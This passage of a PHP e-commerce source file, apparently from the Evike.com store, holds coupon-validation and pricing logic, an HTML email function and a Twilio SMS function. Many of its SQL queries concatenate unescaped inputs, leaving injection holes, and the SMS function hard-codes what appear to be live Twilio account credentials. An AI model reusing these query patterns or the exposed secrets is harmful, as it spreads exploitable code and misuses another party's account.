        if ( $couponinfo['coupons_map_discount'] > $couponinfo['coupons_discount_amount'] ) { $couponinfo['coupons_map_discount'] = $couponinfo['coupons_discount_amount']; }
        $mapquery = mysqli_query( $link, "SELECT manufacturers_map FROM manufacturers WHERE manufacturers_id='" . (int)$priceresult['manufacturers_id'] . "'" );
        $mapresult = mysqli_fetch_array( $mapquery );
        if ( $mapresult['manufacturers_map'] == 'Enforced' || $priceresult['products_map'] == 1 ) { return round( $priceresult['products_price'] * ( 1 - (float)$couponinfo['coupons_map_discount'] ), 2 ); }
        else { return round( $priceresult['products_price'] * ( 1 - $couponinfo['coupons_discount_amount'] ), 2 ); }
      }
      else {
        return round( $priceresult['products_price'] * ( 1 - $couponinfo['coupons_discount_amount'] ), 2 );
      }
    }
    elseif ( $couponinfo['coupons_id'] == $coupon_id && $couponinfo['coupons_discount_type'] == 'fixed' ) {
      $carttotal = 0;
      if ( !empty( $cartproducts ) ) {
        foreach ( $cartproducts as $key => $cartproductdata ) {
          $cartproduct = explode( ',', $cartproductdata );
          $cartqty = $cartproduct[0];
          $cartpid = $cartproduct[1];
          if ( iscouponvalid( $cartpid, $coupon_id ) ) {
            $cartproductquery = mysqli_query( $link, "SELECT p.*, m.manufacturers_discount FROM products p LEFT JOIN manufacturers m ON p.manufacturers_id=m.manufacturers_id WHERE p.products_id='" . $cartpid . "'" );
            $cartproductinfo = mysqli_fetch_array( $cartproductquery );
            $cartproductprice = getsellprice( $cartproductinfo['products_id'], $customertier, $cartproductinfo['products_price'], $cartproductinfo['manufacturers_discount'] );
            $carttotal += $cartproductprice * $cartqty;
          }
        }
      }
      if ( $carttotal >= $couponinfo['coupons_min_order'] ) {
        if ( $couponinfo['coupons_id'] == 'BLK2021' || $couponinfo['coupons_id'] == 'USA2022' ) {
          if ( $carttotal >= 400 ) { $couponinfo['coupons_discount_amount'] = 60; }
          elseif ( $carttotal >= 200 ) { $couponinfo['coupons_discount_amount'] = 30; }
        }
        $percentage_applied = $couponinfo['coupons_discount_amount'] / $carttotal;
        return round( getsellprice( $priceresult['products_id'], $customertier, $priceresult['products_price'], $priceresult['manufacturers_discount'] ) * ( 1 - $percentage_applied ), 2 );
      }
      return round( $priceresult['products_price'], 2 );
    }
    else { return $priceresult['products_price']; }
  }
  else { return $priceresult['products_price']; }
}
function iscouponvalid( $product_id, $coupon_id ) {
  global $link;
  if ( $product_id > 0 && $coupon_id != '' ) {
    $productquery = mysqli_query( $link, "SELECT * FROM products WHERE products_id='" . $product_id . "'" );
    $productresult = mysqli_fetch_array( $productquery );
    $fixeddiscount = false;
    if ( ( strtotime( "now" ) < strtotime( "2019-10-19 00:00:00" ) || strtotime( "now" ) > strtotime( "2019-10-20 00:00:00" ) ) && $coupon_id == 'airsoftcon' ) { return false; }
    # AirsoftCON event pricing
    if ( strtotime( "now" ) > strtotime( "2019-10-19 00:00:00" ) && strtotime( "now" ) < strtotime( "2019-10-20 00:00:00" ) ) {
      $event_pricing_query = mysqli_query( $link, "SELECT * FROM products_pricing_event WHERE event='airsoftcon-2019' AND products_id='" . $product_id . "'" );
      $event_pricing_info = mysqli_fetch_array( $event_pricing_query );
      if ( $event_pricing_info['products_price'] > 0 ) { return false; }
    }
    $specialcoupons = array( 'prostaff', 'profishing', 'evikefishingvip', 'airsoftcon', 'CNY2015', 'AirsoftCON2017', 'serve' ); # MAP bypass
    $couponsquery = mysqli_query( $link, "SELECT * FROM discount_coupons WHERE coupons_status=1 AND coupons_discount_amount>0 AND coupons_discount_type='percent' AND coupons_date_start<NOW() AND coupons_date_end>NOW() AND coupons_number_available>0 AND ( coupons_outpost_id='9999' OR coupons_outpost_id=0 OR coupons_store_only=0 ) AND coupons_map_discount>=0.0001" );
    while ( $couponsresult = mysqli_fetch_array( $couponsquery ) ) { $specialcoupons[] = $couponsresult['coupons_id']; }
    $couponsquery = mysqli_query( $link, "SELECT * FROM discount_coupons WHERE coupons_status=1 AND coupons_discount_amount>0 AND coupons_discount_type='fixed' AND coupons_date_start<NOW() AND coupons_date_end>NOW() AND coupons_number_available>0 AND ( coupons_outpost_id='9999' OR coupons_outpost_id=0 OR coupons_store_only=0 )" );
    while ( $couponsresult = mysqli_fetch_array( $couponsquery ) ) { $specialcoupons[] = $couponsresult['coupons_id']; if ( $coupon_id == $couponsresult['coupons_id'] ) { $fixeddiscount = true; } }
    $dailydealquery = mysqli_query( $link, "SELECT status FROM specials_00 WHERE products_id='" . $product_id . "'" );
    $dailydealresult = mysqli_fetch_array( $dailydealquery );
    if ( $dailydealresult['status'] == 1 ) { return false; }
    if ( $productresult['products_multisplit'] != '' ) {
      $multisplit_lines = explode( "\n", $productresult['products_multisplit'] );
      foreach ( $multisplit_lines as $multisplit_line ) {
        $multisplit_productdata = explode( ',', $multisplit_line );
        $multisplit_product = trim( $multisplit_productdata[0] );
        $multisplit_qty = trim( $multisplit_productdata[1] );
        $mdailydealquery = mysqli_query( $link, "SELECT status FROM specials_00 WHERE products_id='" . $multisplit_product . "'" );
        $mdailydealresult = mysqli_fetch_array( $mdailydealquery );
        if ( $mdailydealresult['status'] == 1 ) { return false; }
      }
    }
    if ( $fixeddiscount == false ) {
      $specialquery = mysqli_query( $link, "SELECT status FROM specials WHERE products_id='" . $product_id . "'" );
      $specialresult = mysqli_fetch_array( $specialquery );
      if ( $specialresult['status'] == 1 ) { return false; }
      $specialposquery = mysqli_query( $link, "SELECT status FROM specials_pos WHERE products_id='" . $product_id . "'" );
      $specialposresult = mysqli_fetch_array( $specialposquery );
      if ( $specialposresult['status'] == 1 ) { return false; }
      if ( $productresult['products_map'] == 1 && !in_array( $coupon_id, $specialcoupons ) ) { return false; }
      $manufquery = mysqli_query( $link, "SELECT m.* FROM products p LEFT JOIN manufacturers m ON p.manufacturers_id=m.manufacturers_id WHERE p.products_id='" . $product_id . "'" );
      $manufresult = mysqli_fetch_array( $manufquery );
      if ( $manufresult['manufacturers_discount'] > 0 ) { return false; }
      if ( $manufresult['manufacturers_map'] == 'Enforced' && !in_array( $coupon_id, $specialcoupons ) ) { return false; }
    }
    $productexclusionquery = mysqli_query( $link, "SELECT * FROM discount_coupons_to_products WHERE coupons_id='" . $coupon_id . "' AND products_id='" . $product_id . "'" );
    $productexclusionresult = mysqli_fetch_array( $productexclusionquery );
    if ( $productexclusionresult['products_id'] == $product_id ) { return false; }
    if ( $productresult['manufacturers_id'] > 0 ) {
      $manufexclusionquery = mysqli_query( $link, "SELECT * FROM discount_coupons_to_manufacturers WHERE coupons_id='" . $coupon_id . "' AND manufacturers_id='" . $productresult['manufacturers_id'] . "'" );
      $manufexclusionresult = mysqli_fetch_array( $manufexclusionquery );
      if ( $manufexclusionresult['coupons_id'] == $coupon_id ) { return false; }
    }
    $excludedcategories = array();
    $categoryexclusionquery = mysqli_query( $link, "SELECT * FROM discount_coupons_to_categories WHERE coupons_id='" . $coupon_id . "'" );
    while ( $categoryexclusionresult = mysqli_fetch_array( $categoryexclusionquery ) ) { $excludedcategories[] = $categoryexclusionresult['categories_id']; }
    #if ( !empty( $excludedcategories ) ) {
      $categoryquery = mysqli_query( $link, "SELECT * FROM products_to_categories WHERE products_id='" . $product_id . "'" );
      while ( $categoryresult = mysqli_fetch_array( $categoryquery ) ) {
        #if ( in_array( $categoryresult['categories_id'], $excludedcategories ) ) { return false; }
        # fishing grand opening special exception
        if ( in_array( $categoryresult['categories_id'], $excludedcategories ) ) {
          if ( $coupon_id == 'profishing' && in_array( $product_id, array( 17321, 17417, 17419, 17418, 17322, 17324, 17323 ) ) && strtotime( "now" ) <= strtotime( "2020-01-19 00:00:00" ) ) { 1; }
          else { return false; }
        }
        if ( in_array( $categoryresult['categories_id'], array( 562, 299 ) ) ) {
          if ( $coupon_id == 'profishing' && in_array( $product_id, array( 17321, 17417, 17419, 17418, 17322, 17324, 17323 ) ) && strtotime( "now" ) <= strtotime( "2020-01-19 00:00:00" ) ) { 1; }
          else { return false; }
        }
        // check subcategories?
      }
    #}
    if ( in_array( $product_id, array( 55114, 69019, 32080, 32081, 83893, 53949, 71782, 22862, 22863, 22856, 22857, 22858, 22859, 22860, 22861 ) ) ) { return false; }
    if ( $productresult['products_non_shipped'] == 1 || $productresult['products_service'] == 1 || $productresult['products_lawenforcement'] == 1 ) {
        #if ( $coupon_id == 'profishing' && in_array( $product_id, array( 17321, 17417, 17419, 17418, 17322, 17324, 17323 ) ) && strtotime( "now" ) <= strtotime( "2020-01-19 00:00:00" ) ) { 1; }
        if ( $coupon_id == 'NEWYEARFISHING' && in_array( $product_id, array( 17321, 17417, 17419, 17418, 17322, 17324, 17323 ) ) && strtotime( "now" ) <= strtotime( "2021-02-01 00:00:00" ) ) { 1; }
        else { return false; }
    }
    $prodcatsquery = mysqli_query( $link, "SELECT * FROM products_to_categories WHERE products_id='" . $product_id . "'" );
    while ( $prodcats = mysqli_fetch_array( $prodcatsquery ) ) {
      if ( in_array( $prodcats['categories_id'], array( 562, 299 ) ) ) {
        #if ( $coupon_id == 'profishing' && in_array( $product_id, array( 17321, 17417, 17419, 17418, 17322, 17324, 17323 ) ) && strtotime( "now" ) <= strtotime( "2020-01-19 00:00:00" ) ) { 1; }
        if ( $coupon_id == 'NEWYEARFISHING' && in_array( $product_id, array( 17321, 17417, 17419, 17418, 17322, 17324, 17323 ) ) && strtotime( "now" ) <= strtotime( "2021-02-01 00:00:00" ) ) { 1; }
        else { return false; }
      }
    }
    return true;
  }
  else { return false; }
}
function sendhtmlemail( $toaddress, $emailsubject, $emailbody, $fromname, $fromaddress ) {
  // Clean data
  $toaddress = str_replace( "\r", '', $toaddress );
  $toaddress = str_replace( "\n", '', $toaddress );
  $emailsubject = str_replace( "\r", '', $emailsubject );
  $emailsubject = str_replace( "\n", '', $emailsubject );
  $fromname = str_replace( "\r", '', $fromname );
  $fromname = str_replace( "\n", '', $fromname );
  $fromaddress = str_replace( "\r", '', $fromaddress );
  $fromaddress = str_replace( "\n", '', $fromaddress );
  if ( $emailsubject == '' ) { $emailsubject = 'Notification from Evike.com Superstore'; }
  if ( $fromname != '' ) {
    $fromname = str_replace( '<', '', $fromname );
    $fromname = str_replace( '>', '', $fromname );
    $fromname = str_replace( '@', '', $fromname );
    $fromname = str_replace( ',', '', $fromname );
    $fromname = str_replace( ';', '', $fromname );
    $fromemail = $fromname . ' <' . strip_tags( $fromaddress ) . '>';
  }
  else { $fromemail = strip_tags( $fromaddress ); }

  // Create header
  $emailheaders = "From: " . $fromemail . "\r\n";
  if ( $fromaddress != '<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="bdd3d290cfd8cdd1c4fdd8cbd4d6d893ded2d0">[email&#160;protected]</a>' ) { $emailheaders .= "Reply-To: ". strip_tags( $fromaddress ) . "\r\n"; }
  $emailheaders .= "MIME-Version: 1.0\r\n";
  $emailheaders .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

  // Compose message
  $emailmessage = '<html style="margin:0;padding:0;width:100%;"><body style="margin:0;padding:0;width:100%;background:#fff;">';
  $emailmessage .= '<style>a{color:#222;text-decoration:none;} a:hover{color:#041b83;text-decoration:underline;}</style>';
  $emailmessage .= '<table width="100%" cellpadding="0" cellspacing="0" border="0" align="center">';
  $emailmessage .= '<tr><td bgcolor="#f5f5f5"><div style="margin:5px auto;width:600px;"><a href="https://www.evike.com/" target="_blank"><img src="http://www.evike.com/images3/logo-evike.png" width="244" height="60" border="0" /></a></div></td></tr>';
  $emailmessage .= '<tr><td bgcolor="#000000" style="height:5px;"></td></tr>';
  $emailmessage .= '<tr><td bgcolor="#ffffff">';
  $emailmessage .= '<table width="600" cellpadding="0" cellspacing="0" border="0" align="center">';
  $emailmessage .= '<tr><td><div style="padding:15px 5px 10px;font-family:arial,helvetica,tahoma,sans serif;font-size:11pt;color:#222;line-height:120%;min-height:150px;">';
  $emailmessage .= $emailbody;
  $emailmessage .= '</div></td></tr>';
  $emailmessage .= '</table>';
  $emailmessage .= '</td></tr>';
  $emailmessage .= '<tr><td bgcolor="#000000">';
  $emailmessage .= '<div style="margin:0 auto;padding:8px 0 15px;width:600px;text-align:center;color:#eee;"><div style="margin:8px 0;padding:5px 0;">';
  $emailmessage .= '<a href="https://www.facebook.com/AirsoftEvike" title="Facebook" target="_blank"><img src="http://www.evike.com/email/facebook.png" style="margin:0 5px;" height="24" width="24" border="0" /></a>';
  $emailmessage .= '<a href="https://www.youtube.com/user/evikecom" title="YouTube" target="_blank"><img src="http://www.evike.com/email/youtube.png" style="margin:0 5px;" height="24" width="24" border="0" /></a>';
  $emailmessage .= '<a href="https://www.instagram.com/evikeairsoftofficial/" title="Instagram" target="_blank"><img src="http://www.evike.com/email/instagram.png" style="margin:0 5px;" height="24" width="24" border="0" /></a>';
  #$emailmessage .= '<a href="https://www.instagram.com/airsoftevike/" title="Instagram" target="_blank"><img src="http://www.evike.com/email/instagram.png" style="margin:0 5px;" height="24" width="24" border="0" /></a>';
  $emailmessage .= '<a href="https://twitter.com/evikesuperstore" title="Twitter" target="_blank"><img src="http://www.evike.com/email/twitter.png" style="margin:0 5px;" height="24" width="24" border="0" /></a>';
  $emailmessage .= '<a href="https://www.tiktok.com/@airsoftevike" title="TikTok" target="_blank"><img src="http://www.evike.com/email/tiktok.png" style="margin:0 5px;" height="24" width="24" border="0" /></a>';
  $emailmessage .= '</div>';
  $emailmessage .= '<div>Copyright &copy; ' . date( "Y" ) . ' Evike.com<br/>2801 W. Mission Rd., Alhambra, CA 91803, USA</div>';
  $emailmessage .= '<div><a href="tel:626-407-0561" style="color:#eee;">(626) 407-0561</a> | <a href="https://www.evike.com/evike-superstore/" style="color:#eee;">Contact Us</a></div>';
  $emailmessage .= '<div style="padding:10px 0;font-size:8pt;">You are receiving this email because of your shopping activity at Evike.com Superstore.<br/>We promise to only use your information according to our <a href="http://www.evike.com/privacy-policy/" target="_blank" style="color:#eee;">privacy policy</a>.</div>';
  $emailmessage .= '</div>';
  $emailmessage .= '</td></tr>';
  $emailmessage .= '</table>';
  $emailmessage .= '<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script></body></html>';

  if ( mail( $toaddress, $emailsubject, $emailmessage, $emailheaders ) ) { return true; }
  else { return false; }
}
function sendsms( $smsnum, $smsmsg ) {
  $originnum = '+16262380608';
  $username = 'AC4ced72bae9062c29467f5ae057fd8236';
  $password = 'e5030cc34885b6b2b07b444227486442';

  $smsnum = preg_replace( '~^(\+)|\D~', '\1', $smsnum );
  if ( strlen( $smsnum ) == 10 && $smsnum[0] != '1' ) { $smsnum = '1' . $smsnum; }
  elseif ( strlen($smsnum) != 11 || $smsnum[0] != '1' ) { $smsnum = ''; }

  if ( $smsnum !='' && $smsmsg != '' && strlen( $smsnum ) == 11 && $smsnum[0] == '1' ) {
    $url = 'https://api.twilio.com/2010-04-01/Accounts/' . $username . '/Messages.json';
    $data = array(
      'Body'  => $smsmsg,
      'From'  => $originnum,
      'To'    => $smsnum,
    );
    $options = array(
      CURLOPT_URL            => $url,
      CURLOPT_POST           => true,
      CURLOPT_POSTFIELDS     => $data,
      CURLOPT_USERPWD        => $username . ':' . $password,
      CURLOPT_RETURNTRANSFER => true,
    );
    $ch =  curl_init();
    curl_setopt_array( $ch, $options );
    $results = curl_exec( $ch );
    if ( curl_error( $ch ) ) {
      curl_close( $ch );
      return false;
    }
    else {
      curl_close( $ch );
      $json_result = json_decode( $results, true );
      if ( is_null( $json_result['error_code'] ) ) { return true; }
      elseif ( $json_result['error_message'] ) { return false; }
      else { return false; }
    }
  }
  else { return false; }
}

?>
